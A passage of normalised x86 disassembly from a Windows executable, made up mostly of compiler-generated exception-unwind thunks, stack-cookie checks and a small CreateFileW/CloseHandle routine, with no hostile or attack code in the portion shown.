add esp 0xc
pop ebp
retn
sub_450c92
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_450cb1
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_450ec0
lea ecx [ ebp - 0x10 ]
jmp sub_4361b0
sub_450ec8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_450ee3
mov ecx [ ebp - 0x10 ]
jmp sub_402830
sub_450eeb
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_403650
sub_450ef6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_450f11
push [ ebp + 0x8 ]
call sub_43811c
pop ecx
retn
sub_450f1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_450f36
lea ecx [ ebp - 0x14 ]
jmp sub_4361b0
sub_450f3e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_450f59
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_450f61
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_450f86
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_450f8e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_450fb3
mov ecx [ ebp - 0x10 ]
jmp sub_4036e0
sub_450fbb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_450fd6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451000
mov ecx [ ebp - 0x10 ]
jmp sub_4361b0
sub_451008
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_403650
sub_451013
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_403650
sub_45101e
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_403650
sub_451029
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_403650
sub_451034
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451050
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451070
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451090
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4510b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4510d0
mov ecx [ ebp - 0x10 ]
jmp sub_4361b0
sub_4510d8
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_403650
sub_4510e3
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_403650
sub_4510ee
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_403650
sub_4510f9
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_403650
sub_451104
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451120
mov eax [ ebp - 0x14 ]
push eax
call sub_43811c
pop ecx
retn
sub_45112b
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x38 ]
jmp sub_4026b0
sub_451144
mov ecx [ ebp - 0x14 ]
jmp sub_402830
sub_45114c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451170
lea ecx [ ebp - 0x18 ]
jmp sub_4361b0
sub_451178
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4511a0
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_4361e1
sub_4511ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4511d0
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_4361e1
sub_4511db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451200
lea esi [ ebp + 0x24 ]
jmp sub_4218d0
sub_451208
lea esi [ ebp + 0x8 ]
jmp sub_4218d0
sub_451210
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451230
lea ecx [ ebp - 0x54 ]
jmp sub_402840
sub_451238
lea ecx [ ebp - 0x30 ]
jmp sub_405a40
sub_451240
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451270
lea ecx [ ebp - 0x54 ]
jmp sub_402840
sub_451278
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_451280
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4512b0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4512d0
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_403b70
sub_4512db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451300
mov eax [ ebp - 0x10 ]
push eax
call sub_43811c
pop ecx
retn
sub_45130b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451330
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451350
lea ecx [ ebp - 0x18 ]
jmp sub_4361b0
sub_451358
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451380
lea ecx [ ebp - 0x10 ]
jmp sub_402840
sub_451388
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4513b0
lea ecx [ ebp - 0x84 ]
jmp sub_402840
sub_4513bb
lea ecx [ ebp - 0x48 ]
jmp sub_405a40
sub_4513c3
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_4513cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451400
lea ecx [ ebp - 0x64 ]
jmp sub_402840
sub_451408
lea ecx [ ebp - 0x4c ]
jmp sub_405a40
sub_451410
lea ecx [ ebp - 0x30 ]
jmp sub_405a40
sub_451418
lea ecx [ ebp - 0x30 ]
jmp sub_405a40
sub_451420
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_437c1c
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451450
mov eax [ ebp - 0x78 ]
push eax
call sub_43811c
pop ecx
retn
sub_45145b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451490
mov eax [ ebp - 0x1c ]
push eax
call sub_43811c
pop ecx
retn
sub_45149b
mov eax [ ebp - 0x1c ]
push eax
call sub_43811c
pop ecx
retn
sub_4514a6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4514d0
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_4514d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451500
lea ecx [ ebp - 0x78 ]
jmp sub_402840
sub_451508
lea ecx [ ebp - 0x48 ]
jmp sub_405a40
sub_451510
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_451518
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451540
lea ecx [ ebp - 0x78 ]
jmp sub_402840
sub_451548
lea ecx [ ebp - 0x48 ]
jmp sub_405a40
sub_451550
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_451558
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451580
lea ecx [ ebp - 0x48 ]
jmp sub_405a40
sub_451588
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_451590
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4515c0
lea ecx [ ebp - 0x40 ]
jmp sub_402840
sub_4515c8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_437c1c
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4515f0
lea ecx [ ebp - 0x44 ]
jmp sub_402840
sub_4515f8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_437c1c
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451620
lea ecx [ ebp - 0x40 ]
jmp sub_402840
sub_451628
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451650
lea ecx [ ebp - 0x50 ]
jmp sub_402840
sub_451658
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451680
lea ecx [ ebp - 0x70 ]
jmp sub_402840
sub_451688
lea esi [ ebp - 0x4c ]
jmp sub_4218d0
sub_451690
lea esi [ ebp - 0x2c ]
jmp sub_4218d0
sub_451698
lea esi [ ebp - 0x2c ]
jmp sub_4218d0
sub_4516a0
lea ecx [ ebp - 0x68 ]
jmp sub_402840
sub_4516a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4516d0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_4516e1
mov esi [ ebp - 0x14 ]
add esi 0x4
jmp sub_4218d0
sub_4516ec
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451710
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451721
mov esi [ ebp - 0x1c ]
add esi 0x4
jmp sub_4218d0
sub_45172c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451750
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451770
mov esi [ ebp + 0x8 ]
jmp sub_4218d0
sub_451778
mov esi [ ebp + 0x8 ]
add esi 0x1c
jmp sub_4218d0
sub_451783
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4517a0
mov esi [ ebp + 0x8 ]
add esi 0x8
jmp sub_4218d0
sub_4517ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4517d0
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_4517d8
lea ecx [ ebp - 0x2c ]
jmp sub_405a40
sub_4517e0
lea ecx [ ebp - 0x48 ]
jmp sub_405a40
sub_4517e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451810
mov esi [ ebp + 0x8 ]
jmp sub_4218d0
sub_451818
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451840
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451851
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451870
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451890
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_4518a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4518c0
mov esi [ ebp + 0x8 ]
add esi 0x20
jmp sub_4218d0
sub_4518cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4518f0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451901
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451920
mov ecx [ ebp + 0x8 ]
jmp sub_405a40
sub_451928
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451950
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451970
lea ecx [ ebp - 0x90 ]
jmp sub_402840
sub_45197b
lea ecx [ ebp - 0x4c ]
jmp sub_405a40
sub_451983
lea ecx [ ebp - 0x30 ]
jmp sub_405a40
sub_45198b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4519c0
lea ecx [ ebp - 0x64 ]
jmp sub_402840
sub_4519c8
lea esi [ ebp - 0x4c ]
jmp sub_4218d0
sub_4519d0
lea esi [ ebp - 0x30 ]
jmp sub_4218d0
sub_4519d8
lea esi [ ebp - 0x30 ]
jmp sub_4218d0
sub_4519e0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_437c1c
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451a10
lea ecx [ ebp + 0xc ]
jmp sub_402840
sub_451a18
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451a40
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451a60
mov eax [ ebp + 0x8 ]
jmp sub_4067b0
sub_451a68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451a90
lea esi [ ebp - 0x2c ]
jmp sub_4218d0
sub_451a98
lea esi [ ebp - 0x2c ]
jmp sub_4218d0
sub_451aa0
lea esi [ ebp - 0x48 ]
jmp sub_4218d0
sub_451aa8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451ad0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451af0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451b01
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451b12
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451b30
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451b38
lea eax [ ebp - 0x28 ]
push eax
call sub_4045e0
retn
sub_451b42
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451b4a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451b70
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451b78
lea eax [ ebp - 0x28 ]
push eax
call sub_4045e0
retn
sub_451b82
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451b8a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451bb0
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_4265b0
sub_451bbb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451be0
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451be8
lea eax [ ebp - 0x28 ]
push eax
call sub_4045e0
retn
sub_451bf2
lea ecx [ ebp - 0x18 ]
jmp sub_402840
sub_451bfa
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451c02
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451c20
lea eax [ ebp - 0x38 ]
jmp sub_4067b0
sub_451c28
lea eax [ ebp - 0x38 ]
push eax
call sub_4045e0
retn
sub_451c32
lea ecx [ ebp - 0x18 ]
jmp sub_402840
sub_451c3a
lea eax [ ebp - 0x38 ]
jmp sub_4067b0
sub_451c42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451c60
lea eax [ ebp - 0x2c ]
jmp sub_4067b0
sub_451c68
lea eax [ ebp - 0x2c ]
push eax
call sub_4045e0
retn
sub_451c72
lea ecx [ ebp - 0x1c ]
jmp sub_402840
sub_451c7a
lea eax [ ebp - 0x2c ]
jmp sub_4067b0
sub_451c82
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451ca0
lea eax [ ebp - 0x2c ]
jmp sub_4067b0
sub_451ca8
lea eax [ ebp - 0x2c ]
push eax
call sub_4045e0
retn
sub_451cb2
lea ecx [ ebp - 0x1c ]
jmp sub_402840
sub_451cba
lea eax [ ebp - 0x2c ]
jmp sub_4067b0
sub_451cc2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451ce0
lea eax [ ebp - 0x2c ]
jmp sub_4067b0
sub_451cf8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451d20
lea eax [ ebp - 0x30 ]
jmp sub_4067b0
sub_451d28
lea eax [ ebp - 0x30 ]
push eax
call sub_4045e0
retn
sub_451d32
lea ecx [ ebp - 0x18 ]
jmp sub_402840
sub_451d3a
lea eax [ ebp - 0x30 ]
jmp sub_4067b0
sub_451d42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451d60
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451d71
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_4218d0
sub_451d7c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451da0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451db1
mov esi [ ebp - 0x18 ]
jmp sub_4218d0
sub_451db9
mov esi [ ebp - 0x18 ]
add esi 0x1c
jmp sub_4218d0
sub_451dc4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451de0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451e00
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451e11
mov esi [ ebp - 0x18 ]
add esi 0x8
jmp sub_4218d0
sub_451e1c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451e40
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451e51
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451e70
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451e90
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451eb0
lea esi [ ebp - 0x34 ]
jmp sub_410fa0
sub_451eb8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451ee0
lea eax [ ebp - 0x2c ]
jmp sub_4067b0
sub_451ee8
lea eax [ ebp - 0x2c ]
push eax
call sub_4045e0
retn
sub_451ef2
lea ecx [ ebp - 0x1c ]
jmp sub_402840
sub_451efa
lea eax [ ebp - 0x2c ]
jmp sub_4067b0
sub_451f02
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451f20
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451f28
lea eax [ ebp - 0x28 ]
push eax
call sub_4045e0
retn
sub_451f32
lea eax [ ebp - 0x28 ]
jmp sub_4067b0
sub_451f3a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451f60
lea esi [ ebp - 0x234 ]
jmp sub_4218d0
sub_451f6b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x238 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451fa0
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_451fb1
mov esi [ ebp - 0x18 ]
jmp sub_4218d0
sub_451fb9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_451fe0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_452000
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_452011
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_401040
add esp 0x8
retn
sub_452022
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_452040
lea esi [ ebp - 0x6c ]
jmp sub_4218d0
sub_452048
lea esi [ ebp - 0x6c ]
jmp sub_416940
sub_452050
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_437c1c
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_437c1c
mov eax r--data
